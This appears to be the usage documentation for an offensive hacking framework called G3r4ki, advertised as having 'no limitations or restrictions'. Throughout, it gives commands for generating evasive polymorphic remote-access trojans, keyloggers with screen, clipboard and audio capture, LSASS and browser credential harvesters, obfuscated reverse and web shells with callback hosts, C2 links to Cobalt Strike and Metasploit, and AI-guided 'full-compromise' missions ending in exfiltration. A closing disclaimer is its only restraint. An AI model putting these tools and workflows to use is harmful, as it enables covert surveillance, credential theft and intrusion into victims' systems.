# G3r4ki Offensive Framework - Elite Modules

The G3r4ki Offensive Framework provides comprehensive offensive security capabilities with no limitations or restrictions. This document outlines the available elite modules and their usage.

## Table of Contents

1. [RAT Deployment Toolkit](#rat-deployment-toolkit)
2. [Keylogging & Screen Capture Module](#keylogging--screen-capture-module)
3. [Command-and-Control Integration](#command-and-control-integration)
4. [Credential Harvester](#credential-harvester)
5. [Shell Generator](#shell-generator)
6. [Mission Planner](#mission-planner)
7. [Usage Examples](#usage-examples)

## RAT Deployment Toolkit

The Remote Access Trojan (RAT) Deployment Toolkit provides polymorphic, cross-platform backdoor generation capabilities.

### Supported Platforms

- Windows (x86/x64)
- Linux (x86/x64/ARM)
- macOS (x64/ARM)
- Android
- iOS (jailbroken devices)

### Features

- **Polymorphic Generation**: Each build creates a unique binary signature
- **Anti-Detection**: Sophisticated techniques to evade EDRs and AVs
- **Persistence**: Multiple persistence methods per platform
- **Communications**: Encrypted C2 communications over multiple protocols
- **Payloads**: Custom post-exploitation payloads

### Commands

```bash
# Generate a basic RAT
python g3r4ki.py offensive rat generate --platform windows --output windows_rat.exe

# Generate a stealthy RAT with custom options
python g3r4ki.py offensive rat generate --platform linux --persistence cron,systemd --comms https,dns --obfuscation high --output linux_rat

# Deploy a RAT to a target
python g3r4ki.py offensive rat deploy --target 192.168.1.100 --credentials admin:password --platform windows

# Manage deployed RATs
python g3r4ki.py offensive rat list
python g3r4ki.py offensive rat interact --id RAT123
```

## Keylogging & Screen Capture Module

The Keylogging and Screen Capture module enables advanced monitoring of target systems.

### Features

- **Keystroke Logging**: Capture all keystrokes with minimal CPU usage
- **Screen Capture**: Periodic or triggered screenshots
- **Clipboard Monitoring**: Track clipboard contents
- **Browser Integration**: Form data and credentials extraction
- **Audio Recording**: Environment audio capture capability
- **Covert Operation**: Minimal system footprint with anti-detection

### Commands

```bash
# Create a standalone keylogger
python g3r4ki.py offensive keylog generate --platform macos --capture keyboard,screen,clipboard --output mac_keylog

# Deploy keylogger to an existing RAT
python g3r4ki.py offensive keylog deploy --rat-id RAT123 --capture keyboard,screen

# Retrieve captured logs
python g3r4ki.py offensive keylog retrieve --id KEYLOG1 --output-dir /path/to/logs

# View captured keystroke data
python g3r4ki.py offensive keylog view --id KEYLOG1 --timeframe "2023-01-01 to 2023-01-02"
```

## Command-and-Control Integration

The C2 integration module connects G3r4ki with various C2 frameworks and establishes its own lightweight C2 server.

### Supported C2 Frameworks

- Internal G3r4ki C2
- Metasploit Framework
- Cobalt Strike
- Covenant
- Mythic
- Empire
- Sliver

### Features

- **Multi-Framework Control**: Manage agents from multiple C2 frameworks
- **Payload Integration**: Use G3r4ki-generated payloads with external C2
- **Agent Migration**: Move agents between different C2 infrastructures
- **Traffic Obfuscation**: Hide C2 traffic patterns
- **Domain Fronting**: Advanced evasion using domain fronting techniques

### Commands

```bash
# Start the internal C2 server
python g3r4ki.py offensive c2 start --port 443 --ssl 

# Connect to external C2
python g3r4ki.py offensive c2 connect --type cobalt-strike --host 192.168.1.50 --port 50050 --user operator --password P@ssw0rd

# Generate a payload for external C2
python g3r4ki.py offensive c2 payload --c2-type metasploit --lhost 192.168.1.10 --lport 4444 --platform windows --output msf_payload.exe

# List connected C2 frameworks and agents
python g3r4ki.py offensive c2 list
python g3r4ki.py offensive c2 agents

# Interact with an agent
python g3r4ki.py offensive c2 shell --agent-id AGENT1
```

## Credential Harvester

The Credential Harvester module extracts and stores credentials from various sources.

### Credential Sources

- Browser stored passwords
- System credential stores
- Memory extraction (LSASS)
- Network traffic
- Cached/saved credentials
- Keylogged credentials

### Features

- **Active Harvesting**: Direct memory and storage extraction
- **Passive Collection**: Monitor and collect over time
- **Auto Classification**: Identify credential types and importance
- **Secure Storage**: Encrypted credential storage in the database
- **Credential Reuse**: Automatically attempt to use harvested credentials

### Commands

```bash
# Generate a standalone credential harvester
python g3r4ki.py offensive creds generate --platform windows --methods browser,system,memory --output cred_harvest.exe

# Deploy to an existing RAT
python g3r4ki.py offensive creds deploy --rat-id RAT123 --methods all

# Retrieve and view collected credentials
python g3r4ki.py offensive creds retrieve --id HARVEST1
python g3r4ki.py offensive creds list --filter "domain=*.corp.local"

# Test credential validity
python g3r4ki.py offensive creds validate --id CRED123 --service ssh --target 10.0.0.5
```

## Shell Generator

The Shell Generator creates highly customized and obfuscated reverse and bind shells.

### Supported Shell Types

- Reverse Shells
- Bind Shells
- Web Shells
- SSH Backdoors
- UDP Shells
- ICMP Shells
- DNS Tunneling Shells

### Supported Languages/Platforms

- Bash
- PowerShell
- Python
- Perl
- Ruby
- PHP
- JSP/ASPX
- C/C++
- Go
- Rust

### Features

- **Anti-Detection**: Obfuscation to bypass security controls
- **Encryption**: Encrypted communications
- **Persistence**: Automatic reconnection capability
- **Tunneling**: Multi-protocol tunneling options
- **One-liners**: Compact command versions for limited input scenarios

### Commands

```bash
# Generate a reverse shell
python g3r4ki.py offensive shell generate --type reverse --language bash --lhost 192.168.1.5 --lport 4444

# Generate a web shell with password protection
python g3r4ki.py offensive shell generate --type web --language php --password SuperSecret123 --output webshell.php

# Generate an obfuscated PowerShell reverse shell
python g3r4ki.py offensive shell generate --type reverse --language powershell --lhost 192.168.1.5 --lport 4444 --obfuscation high --output rev_shell.ps1

# Start a listener for a reverse shell
python g3r4ki.py offensive shell listen --port 4444
```

## Mission Planner

The Mission Planner orchestrates complex offensive operations using multiple modules in sequence.

### Mission Types

- Reconnaissance
- Initial Access
- Persistence
- Privilege Escalation
- Lateral Movement
- Data Exfiltration
- Full Compromise

### Features

- **Mission Templates**: Pre-configured mission workflows
- **Custom Missions**: Create custom module chains
- **AI Guidance**: AI-assisted mission planning and execution
- **Automated Execution**: Hands-off mission execution with decision points
- **Documentation**: Automatic mission documentation and reporting

### Commands

```bash
# List available mission templates
python g3r4ki.py offensive mission list

# Start a reconnaissance mission
python g3r4ki.py offensive mission start --type recon --target 192.168.1.0/24

# Create a custom mission
python g3r4ki.py offensive mission create --name "Corp Penetration" --steps "recon,access,persistence,privesc,exfil"

# Run a custom mission
python g3r4ki.py offensive mission run --name "Corp Penetration" --target-network 10.0.0.0/24

# View mission status and results
python g3r4ki.py offensive mission status --id MISSION1
python g3r4ki.py offensive mission report --id MISSION1 --output /path/to/report.pdf
```

## Usage Examples

### Basic Penetration Testing Workflow

```bash
# Start interactive shell
python g3r4ki.py interactive

# In the interactive shell:
g3r4ki> offensive recon scan --target 192.168.1.0/24
g3r4ki> offensive vuln scan --target 192.168.1.10 --port 80,443,8080
g3r4ki> offensive shell generate --type reverse --language bash --lhost 192.168.1.5 --lport 4444
g3r4ki> offensive shell listen --port 4444
```

### Deploying a RAT and Collecting Data

```bash
# Generate a RAT
python g3r4ki.py offensive rat generate --platform windows --comms https --persistence registry,wmi --output advanced_rat.exe

# After deploying the RAT manually to the target system:
python g3r4ki.py offensive rat list
python g3r4ki.py offensive rat interact --id RAT123

# In the RAT shell:
RAT123> deploy keylogger
RAT123> deploy cred-harvester
RAT123> screenshot
RAT123> sysinfo
RAT123> shell whoami

# Retrieve collected data:
python g3r4ki.py offensive rat retrieve --id RAT123 --type all --output /path/to/data
```

### Automated Mission Execution

```bash
# Start a full compromise mission
python g3r4ki.py offensive mission start --type full-compromise --target-organization "Example Corp" --scope "*.example.com,192.168.0.0/16" --output-dir /path/to/mission

# Monitor mission progress
python g3r4ki.py offensive mission status --id MISSION1 --watch

# Generate a comprehensive report
python g3r4ki.py offensive mission report --id MISSION1 --format pdf,docx --output /path/to/reports
```

## Disclaimer

The G3r4ki Offensive Framework is designed for educational purposes and authorized security testing only. Users are responsible for complying with all applicable laws and regulations when using these tools. The developers assume no liability for misuse or damage caused by these tools.